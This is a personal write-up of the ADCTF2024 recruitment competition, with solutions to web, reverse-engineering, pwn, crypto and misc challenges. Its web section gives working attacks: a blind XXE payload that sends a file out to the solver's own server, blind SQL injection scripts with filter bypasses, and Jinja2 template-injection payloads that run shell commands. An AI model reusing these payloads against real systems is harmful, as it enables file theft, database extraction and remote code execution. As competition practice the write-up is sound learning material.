---
title: "ADCTF2024"
date: 2024-12-02
draft: false
description: "AD Studio 2024 Recruitment Competition"
summary: "Personal WriteUP of AD Studio 2024 Recruitment Competition"
tags: ["writeup", "ctf"]
categories: ["writeup"]
---

{{< alert >}}
**WARNING！** This is a machine translated version of the [Chinese page](/posts/adctf2024/)
{{< /alert >}}

## Web

### xxe

Backdoor found after opening using jd-gui

```java
@GetMapping({"/backdoor"})
@ResponseBody
public String hack(@RequestParam String fname) throws IOException, SAXException {
    DefaultResourceLoader resourceLoader = new DefaultResourceLoader();
    byte[] content = resourceLoader.getResource(fname).getContentAsByteArray();
    if (content != null) {
        XMLReader reader = XMLReaderFactory.createXMLReader();
        reader.parse(new InputSource(new ByteArrayInputStream(content)));
        return "success";
    } 
    return "error";
}
```

Pass in fname and parse XML

fname is controllable and can be passed into external XML

Construct XXE to read flag

```eval.xml
# eval.xml

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM "http://LINK_TO_YOUR_SERVER/eval.dtd">
    %xd;
]>
<root>&bbbb;&demo;</root>
```

```eval.dtd
# eval.dtd

<!ENTITY % aaaa SYSTEM "file:///flag">
<!ENTITY % demo "<!ENTITY bbbb SYSTEM 'http://LINK_TO_YOUR_SERVER/?file=%aaaa;'>">
%demo;
```

Listen for http requests locally

```shell
python3 -m http.server 9000
```

Initiate a request to trigger XXE

```http://TARGET:33008/backdoor?fname=http://LINK_TO_YOUR_SERVER/eval.xml```

Get the flag in the request log

> 120.230.56.2 - - [30/Nov/2024 23:03:20] "GET /eval.xml HTTP/1.1" 200 -
> 120.230.56.2 - - [30/Nov/2024 23:03:20] "GET /eval.dtd HTTP/1.1" 200 -
> 120.230.56.2 - - [30/Nov/2024 23:03:40] "GET /eval.xml HTTP/1.1" 200 -
> 120.230.56.2 - - [30/Nov/2024 23:03:40] "GET /eval.dtd HTTP/1.1" 200 -
> 120.230.56.2 - - [30/Nov/2024 23:04:08] "GET /eval.xml HTTP/1.1" 200 -
> 120.230.56.2 - - [30/Nov/2024 23:04:08] "GET /eval.dtd HTTP/1.1" 200 -
> 120.230.56.2 - - [30/Nov/2024 23:05:09] "GET /eval.xml HTTP/1.1" 200 -
> 120.230.56.2 - - [30/Nov/2024 23:05:09] "GET /eval.dtd HTTP/1.1" 200 -
> 120.230.56.2 - - [30/Nov/2024 23:05:09] "GET /?file=ADCTF{WOW_Y0u_Kn0w_H0w_to_use_Blind_XXE} HTTP/1.1" 200 -

> ADCTF{WOW_Y0u_Kn0w_H0w_to_use_Blind_XXE}

### sql1

Pass the serialized string of student from POST(data) and query $student after filtering

```
$black_list = '/\=|\\x20|\\n|union|substr|ascii|\//i';
```

Filtered ```union```, ```ascii```, ```substr```, space, equal sign, newline

Unable to use union injection, ascii can be replaced with ord, substr can be replaced with mid, spaces can be replaced with tabs, and equal signs can be replaced with like (which is not actually used)

Echo is available, runs the Boolean blind injection script directly

```python
import httpx
import readline
import html
import re
import urllib.parse

target = 'http://TARGET:33001/'
passphrase = 'C H A N G E M E'

def exp(payload: str, out:bool):
    payload = f"Alice'&& {payload} #"
    payload = payload.replace('=', ' like ')
    payload = payload.replace(' ','\t')
    
    payload = {
        'data': 'O:7:"Student":1:{s:12:"student_name";s:'+"{}".format(len(payload))+':"'+payload+'";}'
    }
    auth = httpx.BasicAuth('user', passphrase)
    r = httpx.post(target, data=payload,auth=auth,timeout=60)
    pattern = r'</code>(.*)'
    result = re.search(pattern, r.text)
    # if out:
    #     print(result.group(1))
    if('Alice' in result.group(1)):
        if(out):
            print(True)
        return True
    elif ('no' in result.group(1)):
        print('**Filtered**')
        print(payload)
    else:
        if(out):
            print(False)
    return False
    
if __name__ == '__main__':
    result = ''
    sql = "(select group_concat(secret_value) from secrets)"
    length = 88
    for i in range(1,length + 1):
        left = 0
        right = 127
        while right - left > 1:
            mid = int((left+right)/2)
            print(f'[{i}] {left} {right} ',end='\r')
            payload = f'ord(mid({sql},{i},1)) > {mid}'
            if(exp(payload, False)):
                left = mid
            else:
                right = mid
        print(f'{chr(right)} {right} [{i}/{length}]')
        result += chr(right)
    print(result)
    while True:
        exp(input('> '), True)
    
```

> flag{53048e06-1dbe-423b-8cf8-458ccd591a58}

### sql2

Same as sql1, the only difference is that there is no echo, and time blind injection must be used

```python
import httpx
import readline
import html
import re
import urllib.parse
from datetime import datetime
import time

target = 'http://TARGET:33004/'
passphrase = '02e9f90e494fe5a2727176f6952abc99'

def exp(payload: str, out:bool):
    # build payload
    payload = f"Alice'&& IF({payload},SLEEP(1),2) #"
    
    # bypass detect
    payload = payload.replace('=', ' like ')
    payload = payload.replace(' ','\t')
    
    payload = {
        'data': 'O:7:"Student":1:{s:12:"student_name";s:'+"{}".format(len(payload))+':"'+payload+'";}'
    }
    
    # Start Quere
    auth = httpx.BasicAuth('user', passphrase)
    Time = datetime.now()
    r = httpx.post(target, data=payload,auth=auth,timeout=60)
    Time = datetime.now() - Time
    
    # process result
    if (out):
        print(f'Cost: {Time}')
    pattern = r'</code>(.*)'
    result = re.search(pattern, r.text)
    if ('no' in result.group(1)):
        print('**Filtered**')
        print(payload)
    if (Time.seconds > 5):
        print("WARNING: SPEED LIMIT HAPPEDED")
        print(payload)
    if (Time.seconds > 1):
        if (out):
            print (True)
        return True
    if (out):
        print(False)
    return False
    
if __name__ == '__main__':
    result = ''
    sql = "(select group_concat(secret_value) from secrets)"
    length = 88
    for i in range(1,length + 1):
        left = 0
        right = 127
        while right - left > 1:
            mid = int((left+right)/2)
            print(left,right,end='\r')
            payload = f'ord(mid({sql},{i},1)) > {mid}'
            if(exp(payload, False)):
                left = mid
            else:
                right = mid
            time.sleep(0.1)
        print(f'{chr(right)} {right} [{i}/{length}]')
        result += chr(right)
    print(result)
    while True:
        exp(input('> '), True)
```

> flag{2572e0bf-30d1-4c8d-b512-6ded054f21a6}
>

### sst1

Visit the target address to get the website source code

```python
from flask import Flask, request, render_template_string 
from hashlib import md5 

app = Flask(__name__) 
black_list = ['[','\''] 

def waf(name): 
    for x in black_list: 
        if x in name.lower(): 
            print(x) 
            return True 
    return False 

@app.route('/') 
def index(): 
    return open(__file__).read() 

@app.post('/exp') 
def user(): 
    exp = request.form.get("exp") 
    digest = request.form.get("digest") 
    if not exp: 
        return 'need exp' 
    if not digest: 
        return 'need digest' 
    if not digest == md5(exp.encode()).hexdigest(): 
        return 'digest not match' 
    if waf(exp): 
        return "No hacker" 
    return render_template_string(exp) 

if __name__ == '__main__': app.run("0.0.0.0", port=11111)
```

Template injection vulnerability appears in /exp route

You can see that brackets and backslashes are filtered

Constructing the payload

```payload
{{().__class__.__base__.__subclasses__().__getitem__(137).__init__.__globals__.__builtins__.__getitem__("eval")("__import__(\"os\").popen(\"cat flag\").read()")}}
```

Execute to get flag

> flag{a8e5f202-9aac-49b8-ad8f-7fa2c0ac8130}

### sst2

To be honest, I have no idea how to bypass ssti. I have been working on it for a day but still can't figure it out. Please allow me to be a script kiddie for once.

Use [**fenjing**](https://github.com/Marven11/Fenjing) to construct the payload, and then manually construct the request

{{< github repo="Marven11/Fenjing" >}}

```python
import httpx
import html
import readline
from hashlib import md5
import fenjing

target = 'http://TARGET:33008/exp'
# target = 'http://127.0.0.1:11111/exp'
passphrase = '7f036f4d2e2986b8bbdc89187aabf82d'

black_list = ['\'','"','lipsum','.','['] 
def waf(name): 
    for x in black_list: 
        if x in name.lower(): 
            # print(x) 
            return False 
    return True

def exp(payload):
    shell_payload, _ = fenjing.exec_cmd_payload(waf, payload)
    
    auth = httpx.BasicAuth(username="user", password=passphrase)
    data = {
        'exp': shell_payload,
        'digest':md5(shell_payload.encode()).hexdigest()
    }
    r = httpx.post(target,data=data,auth=auth)
    print(f'[+] Payload: {shell_payload}')
    print(html.unescape(r.text))
    
if __name__ == '__main__':
    while True:
        exp(input('> '))
```

> flag{56199a9d-6772-4f27-b78a-9a40f9056db4}

### lottery

Base64 string found in *events/2.json*

> ZmxhZ3thY2FlNTkwMC1hNDg4LTQ0YzUtYWM0YS0wNmYzMTM5Y2NjZWR9Cg==

Decode to get flag

> flag{acae5900-a488-44c5-ac4a-06f3139ccced}

### Sign_in_ADCTF

See the hint in the source code

```html
<!--    H1NT: Call Sign_in_AD() to complete the sign-in   -->
```

Open the console and execute ```Sign_in_AD()``` when the web page is refreshed

See the hint:

> Signed in successfully! But the flag is in the picture^V^

Download the image and put it into Kali to view the EXIF ​​information:

> EXIF tags in './sign.jpg' ('Motorola' byte order):
> --------------------+----------------------------------------------------------
> Tag                 |Value
> --------------------+----------------------------------------------------------
> Artist              |Ak1yamaM1O
> XP Comment          |Follow the ad studio official account and send "ADCTF2024" to get the flag
> XP Author           |Ak1yamaM1O
> Padding             |268 bytes undefined data
> X-Resolution        |72
> Y-Resolution        |72
> Resolution Unit     |Inch
> Padding             |268 bytes undefined data
> Exif Version        |Exif Version 2.1
> FlashPixVersion     |FlashPix Version 1.0
> Color Space         |Uncalibrated
> --------------------+----------------------------------------------------------

Follow the prompts to get the flag

> flag{We1c0me_2o_ADCTF_2O24_H4V4_6o09_t1m3}

### onlineJava

No tricks, just execute the shell

```java
try {
    String command = "cat /flag"; 
    Process process = Runtime.getRuntime().exec(command);
    
    java.io.InputStream inputStream = process.getInputStream();
    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
    
    String line;
    while ((line = reader.readLine()) != null) {
        System.out.println(line);
    }
    
    process.waitFor();
    
} catch (Exception e) {
    e.printStackTrace();
}
```

## Reverse

### checkin

IDA opens and finds that it is an XOR encryption
Encryption uses random numbers
But the random number seed has been specified
So the random number you get each time is the same

Extract the encrypted flag using LazyIDA

```C
encoded = "\x55\x17\xC9\xBB\x4A\xA5\x86\xDF\x24\x0A\x1C\xA3\x27\xA1\x57\x35\xC3\xDB\x91\x88\x6D\x91\xA0\xCC\x71\x57\x71\xE4\x40\x00";
```

Write a decryption script:

```C
#include <stdlib.h>
#include <stdio.h>

int main(){
    srand(0x7E8u);
    char s[] = "\x55\x17\xC9\xBB\x4A\xA5\x86\xDF\x24\x0A\x1C\xA3\x27\xA1\x57\x35\xC3\xDB\x91\x88\x6D\x91\xA0\xCC\x71\x57\x71\xE4\x40\x00";
    for ( int i = 0; i <= 28; ++i )
        s[i] ^= rand();
    puts(s);
    return 0;
}
```

> flag{y0u_Know_rAnd0m_4nd_xOr}

### ezPy

Look at the icon to know it is Python (you can also know it from the title)

use [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to get pyc file

Then use [pylingual](https://pylingual.io) to disassemble pyc file

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: main.py
# Bytecode version: 3.9.0beta5 (3425)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import sys
secret = [631, 1205, -500, 1021, 1879, 668, -281, 1651, 1326, 593, 428, -170, 515, 1302, 452, 41, 814, 379, 382, 629, 650, 273, 1529, 630, 418, 1207, 1076, 315, 1118, 469, 398, 1803, 647, 729, 1439, 1104]
flag = input('Please enter the flag:')
flag = [ord(c) for c in flag]
if len(flag) != 36:
    print('Wrong flag length')
    sys.exit()
encoded = [0 for _ in range(36)]
for i in range(0, 36, 9):
    encoded[i] = 3 * flag[i] + 7 * flag[i + 1] - 2 * flag[i + 2] + 5 * flag[i + 3] - 6 * flag[i + 4] - 14
    encoded[i + 1] = -5 * flag[i + 1] + 9 * flag[i + 2] + 4 * flag[i + 3] - 3 * flag[i + 4] + 7 * flag[i + 5] - 18
    encoded[i + 2] = 6 * flag[i + 0] - 4 * flag[i + 1] + 2 * flag[i + 2] - 9 * flag[i + 5] + 5 * flag[i + 6] - 25
    encoded[i + 3] = 7 * flag[i + 1] + 3 * flag[i + 3] - 8 * flag[i + 4] + 6 * flag[i + 5] - 2 * flag[i + 6] + 4 * flag[i + 7] - 30
    encoded[i + 4] = 2 * flag[i + 0] + 5 * flag[i + 2] - 4 * flag[i + 4] + 7 * flag[i + 5] + 9 * flag[i + 8] - 20
    encoded[i + 5] = 8 * flag[i + 0] - 3 * flag[i + 1] + 5 * flag[i + 3] - 6 * flag[i + 7] + 2 * flag[i + 8] - 19
    encoded[i + 6] = -7 * flag[i + 1] + 4 * flag[i + 2] - 5 * flag[i + 5] + 3 * flag[i + 6] + 6 * flag[i + 8] - 22
    encoded[i + 7] = 9 * flag[i + 0] + 2 * flag[i + 2] + 6 * flag[i + 3] - 4 * flag[i + 6] + 5 * flag[i + 7] - 3 * flag[i + 8] - 27
    encoded[i + 8] = 4 * flag[i + 0] - 5 * flag[i + 4] + 7 * flag[i + 5] + 3 * flag[i + 6] + 9 * flag[i + 7] - 2 * flag[i + 8] - 33
if encoded == secret:
    print('Correct!')
else:
    print('Wrong!')
```

use z3 to solve it

```python
from z3 import *

solver = Solver()

flag = [Int(f'flag_{i}') for i in range(36)]

secret = [631, 1205, -500, 1021, 1879, 668, -281, 1651, 1326, 593, 428, -170, 515, 1302, 452, 41, 814, 379, 382, 629, 650, 273, 1529, 630, 418, 1207, 1076, 315, 1118, 469, 398, 1803, 647, 729, 1439, 1104]

solver.add([flag[i] >= 0 for i in range(36)])
solver.add([flag[i] <= 255 for i in range(36)])

for i in range(0, 36, 9):
    solver.add(3 * flag[i] + 7 * flag[i + 1] - 2 * flag[i + 2] + 5 * flag[i + 3] - 6 * flag[i + 4] - 14 == secret[i])
    solver.add(-5 * flag[i + 1] + 9 * flag[i + 2] + 4 * flag[i + 3] - 3 * flag[i + 4] + 7 * flag[i + 5] - 18 == secret[i + 1])
    solver.add(6 * flag[i + 0] - 4 * flag[i + 1] + 2 * flag[i + 2] - 9 * flag[i + 5] + 5 * flag[i + 6] - 25 == secret[i + 2])
    solver.add(7 * flag[i + 1] + 3 * flag[i + 3] - 8 * flag[i + 4] + 6 * flag[i + 5] - 2 * flag[i + 6] + 4 * flag[i + 7] - 30 == secret[i + 3])
    solver.add(2 * flag[i + 0] + 5 * flag[i + 2] - 4 * flag[i + 4] + 7 * flag[i + 5] + 9 * flag[i + 8] - 20 == secret[i + 4])
    solver.add(8 * flag[i + 0] - 3 * flag[i + 1] + 5 * flag[i + 3] - 6 * flag[i + 7] + 2 * flag[i + 8] - 19 == secret[i + 5])
    solver.add(-7 * flag[i + 1] + 4 * flag[i + 2] - 5 * flag[i + 5] + 3 * flag[i + 6] + 6 * flag[i + 8] - 22 == secret[i + 6])
    solver.add(9 * flag[i + 0] + 2 * flag[i + 2] + 6 * flag[i + 3] - 4 * flag[i + 6] + 5 * flag[i + 7] - 3 * flag[i + 8] - 27 == secret[i + 7])
    solver.add(4 * flag[i + 0] - 5 * flag[i + 4] + 7 * flag[i + 5] + 3 * flag[i + 6] + 9 * flag[i + 7] - 2 * flag[i + 8] - 33 == secret[i + 8])

if solver.check() == sat:
    model = solver.model()
    flag_result = ''.join(chr(model[flag[i]].as_long()) for i in range(36))
    print(f"Flag: {flag_result}")
else:
    print("No solution found")
```

> flag{y0U_4rE_r3@1ly_g0o0oOd_At_m4Th}

### Py_revenge

I guess it is Python (you can also know it from the title)

pyinstxtractor + PyLingual to get source code

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: main.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import base64
secret = [27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46]
flag = input('Please enter the flag:')
flag = base64.b64encode(flag.encode()).decode()
flag = [ord(c) for c in flag]
key = 'ADCTF2024'
for i in range(len(flag)):
    flag[i] ^= ord(key[i % len(key)])
    flag[i] ^= i
if flag == secret:
    print('Correct!')
else:
    print('Wrong!')
```

It looks like XOR + Base64

Just XOR it once, and then decode Base64

```python
import base64
secret = [27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46]
key = 'ADCTF2024'

result = ''
for i in range(len(secret)):
    secret[i] ^= i
    secret[i] ^= ord(key[i % len(key)])
    result += chr(secret[i])
print(base64.b64decode(result).decode())
```

## Pwn

### binsh

Use IDA open it and finds that only two characters can be entered
If the second character is h(104), replace it with b(98)

At first I had no idea why the second character appeared as h.

Finally I remembered sh

*Changing sh to sb is really bad.*(In the Chinese context, this is an insult.)

Remember that ```$0``` can also call the shell

> flag{583b4daf-a393-4bcd-b93e-2100c2ce77d6}

### meow

There is nothing much to say about the script question. Meow~

```python
from pwn import *

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m'+ str(x) + '\x1b[0m')

def dbg(p : process):
  gdb.attach(p, 'source ~/Programs/pwndbg/gdbinit.py')

# Config
LOCAL = False
file = './meow'
remote_addr = '0.0.0.0'
remote_port = 65535
context.log_level='DEBUG' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARNING']
elf = ELF(file)
context.binary = elf

def get_Process():
  if LOCAL:
    p = process(file)
  else:
    p = remote(remote_addr ,remote_port)
    p.sendlineafter(b'Type your passphrase: ', b'passphrase')
  return p

def exp():
  p = get_Process()

  # p.interactive()
  # Real Start of EXP
  
  p.sendlineafter("请回复'喵~'开始\n".encode(), '喵~'.encode())
  
  
  while True:
    payload = p.recvline().decode()[:-1]
    
    print(payload)
    if (payload[-1] == '?'):
      payload = payload[:-1] + '喵?'
    elif (payload[-1] == '!'):
      payload = payload[:-1] + '喵!'
    else:
      payload = payload + '喵~'
    print(payload)
    p.sendlineafter('请输入:'.encode(),payload.encode())
    
  p.interactive()

if __name__ == '__main__':
  exp()
```

> flag{d8facb39-2990-4efa-9649-9c7242acaa5d}喵~

## Crypto

###  Use_Many_Time

Template problem, nothing much to say

Get p,q from factordb

```python
from Crypto.Util.number import *

n = 271472624424656513785706923680771932133715054033425980394077073568817784367419534373403335781047213279328099684778631075010020852340363239109929257593123636490472788742710500691829271154406656967499570620808599990809022444747721621226472999098447873973754640477256467566021323433300316782379572843249101957097476171914061796763882160221810752037588477825281339421214989804806106422337645286183603182582435570582060051797114488129892907097969025919044345960281472097528350236904382867201532480293547156397634024888874181247945486724100923198368861164414053799229573809643496189560293961228262358439897447721272077026577955596476378495555781331390802631948596505810532333928413691919085783591350817862501247468922625100225243353014466352465524402884992557288475473449673329173477799355005388403603540849669807448000951133101061837473065442841126173160221586401667999743065475436042231713071217028338553851930804379457014815136497217622172942725789731656487365400662759041673246263952305177330273165040055678540346032835777756018333782404380070921037783724200080770052468396586141345852821959354352496376533002799798666280242749703930834932216393024552332394747366870653579192862981203841223970368967884378029041333485930753022670356279089241919852655226148387261758145662448291834484689828355196376588241880452162468344771724832727747146706203875543683244719198324124061667256741010066117105718405978693348972717642194095091616302700592766673624550504917867603634542541368375740266071937725051550575451618436991290662488896868128637569245079892637758352664528618064223657481155853608868600031926390171851091738102791194299611556416648756888113654937238624189138830880418480962906152416654876445398057632196937986995992085822575718165073591892866350194485467016785653412183994633115928254714676975956375674614875957033175065090009966949952689186250766814233600527752382571007342869177096365187528130392174264920694275768322770528821969405178452047175169237214071424708443772771459072348156584802498912079521950348331820925988369966076070172436223669851674684504470256163223470647039446081938764730223121989464510919117939913290460289762676092275797366737539534123024502760506615782714363240028877215121539549927135722120154270580276684945221133223162306832578280630822912653337205489280151793861613547764311383072014368485459881701386311716195796935045277483356584921699345142082381019935250848231570451880495222569509469558179017999387883489730684745699017658729849361
c = 262959409928901942946356967282715685988402717525722998413073199552344194569815462675208727317356069038143476887785349729074152415468561305043719564044443534943678461691194112819829009942015928217138669440068055198678626228169095209700084857903899952032493859312798134830127847836090483339421488013318184521018942602658859674923143870041870487415119261615851991532534606572685371087892175187669735837173802901707243259478231127246547498003861531872712139399220445465633130401043038236189470250375275092537677136076465523278093135254194321212116731237463794930347080005994129860018818529190275740308829411887853496055005914245757890730455096895759851033070483269010908006762902321856837578539257154697504866923667155835568667100011559417194297036546745102722888382810645788593405822297665771079070110912560494209334914533558309387853851664235646634342550739566564027709387611635084010476988602665679274092312701989498548485452833766131120307212434583895800389361158177620204656479294383838488961384696760004965555832729706574445815485286337177591334864985323203962452816823109401292600686290645753703318285223851373494687341332009673985128472618489951377449004314976075061089812435706552393436214957004589524906307287978580991550974217938678109879592869816607502026007252288475327472451287082697741140324509606631465050160462644047707063687221390874129122094235339213836858331145379658693745765989963094532579285786465378971800497606443969187141241371884417409400393554875676670693772124227967787087249970176123360898925123323833553629516940180273052472844245188596972497171407972537936080054594306016800782067609134239410680549083033727692776112628144869503299586655898231079773579227330327159838200652203600435140335585943871110523667774597723803449181446601397378968006674324753246013580929038935474151143294980592601911423698794436171646021633991328190789552835952437637863496011173604086905984318805710258969051632322326111378923301936151648733712292832400228718852555700089350581693206572448860973715415938816675920101336567495654357573191994730856103857549775016982813567025601029715927459867603513676152935188298681539416993775403152002836985599653470480800354152755275582198243528888697069870892345692931591655818148732228227890569700323009808337822568147429445530219871559528924454126891741517141491673059521896789132434077118608327133800491064640223646492279791064413028951228474075277822487467158841147454754127758427097085005104226495027785164273717534964

p = 22826089215015062971239747479765573980261860956508924966887672339011131256071593933855569627345730491900186620681430083447450449800363453742460910559038500884300216627993746389795089330113851499728923389157896774203901873995580499872010382271176165914123608852269645266420541883312655519483268190334714005528424143016351241964111694448438696041108115955227931375862495974220469117197567953528127044121313985354817794430503700199549401649666484648419628490258677717450705269977839872907619635351260327914403045603763386492257545870697934887022012834074741429555229113461953163363204273114559929014526316520808246516691
e = 65537

phi_n = p**3 * (p - 1)

d = inverse(e, phi_n)

m = pow(c, d, n)

plaintext = long_to_bytes(m)
print(plaintext)

```

> flag{another_weird_construction}

### Too_Close_To_Sqrt

Two adjacent prime numbers, which means that we can square and pq will come out directly after running for a while.

```python
from gmpy2 import isqrt
from Crypto.Util.number import *

n = 77110253337392483710762885851693115398718726693715564954496625571775664359421696802771127484396119363821442323280817855193791448966346325672454247192244603281463595140923987182065095198239715749980911991399313395478292871386248479783966672279960117003211050451721307589036878362258617072298763845707881171743025954660306653186069633961424298647787491228085801739935823867940079473418881721402983930102278146132444200918211570297746753023639071980907968315022004518691979622641358951345391364430806558132988012728594904676117146959007388204192026655365596585273466096578234688721967922267682066710965927143418418189061
c = 702169486130185630321527556026041034472676838451810139529487621183247331904842057079283224928768517113408797087181581480998121028501323357655408002432408893862758626561073997320904805861882437888050151254177440453995235705432462544064680391673889537055043464482935772971360736797960328738609078425683870759310570638726605063168459207781397030244493359714270821300687562579988959673816634095712866030123140597773571541522765682883740928146364852979096568241392987132397744676804445290807040450917391600712817423804313823998912230965373385456071776639302417042258135008463458352605827748674554004125037538659993074220
e = 65537

p = isqrt(n)
while n % p != 0:
    p += 1
q = n // p

phi_n = (p-1)*(q-1)

d = inverse(e,phi_n)

m = pow(c, d, n)

print(long_to_bytes(m))
```

> flag{oops_the_N_is_not_secure}

### One_Way_Function

sha512 with only a single character

Rainbow Table Attack

```python
from hashlib import sha512

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_{}'

rainbow_table = {}
for c in charset:
    rainbow_table[sha512(c.encode()).hexdigest()] = c

hashes = [
    '711c22448e721e5491d8245b49425aa861f1fc4a15287f0735e203799b65cffec50b5abd0fddd91cd643aeb3b530d48f05e258e7e230a94ed5025c1387bb4e1b',
    'f10127742e07a7705735572f823574b89aaf1cbe071935cb9e75e5cfeb817700cb484d1100a10ad5c32b59c3d6565211108aa9ef0611d7ec830c1b66f60e614d',
 ......
]

flag = ''
for hash in hashes:
    if hash in rainbow_table:
        flag += rainbow_table[hash]
    else:
        print(f"{hash} not found")
print(flag)
```

> flag{d4d07133-d6bb-4add-b194-8c8eec4bb33f}

### One_Key_pad

```python
from secret import flag, key

ciphertext = []

for f in flag:
    ciphertext.append((f ^ key))

print(bytes(ciphertext).hex())

e0eae7e1fde3e7fcffd9fee9f4fb
```

Seeing that the flag is encrypted byte by byte, there are only 256 possible keys, so just enumerate the keys

```python
ciphertext = bytes.fromhex('e0eae7e1fde3e7fcffd9fee9f4fb')
for key in range(0xff):
    flag = b''
    for c in ciphertext:
        flag += bytes([c^key])
    if flag.startswith(b'flag{'):
        print(flag.decode())
        exit()
```

### Check_Your_Factor_Database

[FactorDB](https://factordb.com)

```python
from Crypto.Util.number import *

n = 15583202069585885743329731770693703651315744619547748987654328267750897298525457052637246322711018450296389785154280944187494218432166414466847580546888232777346390261326052791442303045476056323506639620708060686276665740035963899932923469306092864734507521103929958343335077640138132147823877965255516681640595305323863184079626094607124637572731263072411094986661513874040186660293323912225991096820508525802441998965552628844336066341624032465148749156118031186277077034218599879172143727672732486930547036361186338853567795815703079141657486772887537131798381857481761128761701947613223163957583789997131996194389
c = 6371306651441414494898158050750379466411385075727176973777141489866804949152371066737700949957382328723739039588265348722939538409644758452741820636286764732056622302045805546424342834578149204912690500590371488794741154219116429974884626176276687505603436615961383352315424341433102202637442619829308641010524729990244179166911981814627661923080609365126766407039132426191716113002194884261389976932121106269022968620075855360220818974890016650718871530138072213210849868914955977855950213371455369372213479451425395072947888041803100826574552594123357214975040806204084524320510358181592274275785398054808107630303

p = 102786970188634214370227829796268661753428191750544697648009912021832510479846406842660652442082773578020088104585096298944409097150001317920480815093132150004913448767202198299893840769568841219755466694275862843676241177608436424364735585247574303039353776987581503833128444693347920806395102183872665901277
q = 151606784799548610095916644217950865940397761353988655007201180031392776522565708552689972206548545357755036833336762542306291348158476176958083317845208464472445906639525228156065966245815886462442808969891370598247564766047649027653895495777728985622422940233924415769188183003695053034562331004932104400857

e = 65537

phi_n = (p-1)*(q-1)

d = inverse(e,phi_n)

m = pow(c, d, n)

print(long_to_bytes(m))
```

> flag{factor_db_is_useful}

## Misc

### nolibc

```shell
8bce3ee03ac4:/# echo *
4La9-7158808f bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var
8bce3ee03ac4:/# while read line; do echo "$line"; done < 4La9-7158808f
flag{94298258-501b-4e56-be80-5f19af81c913}
```

> flag{94298258-501b-4e56-be80-5f19af81c913}

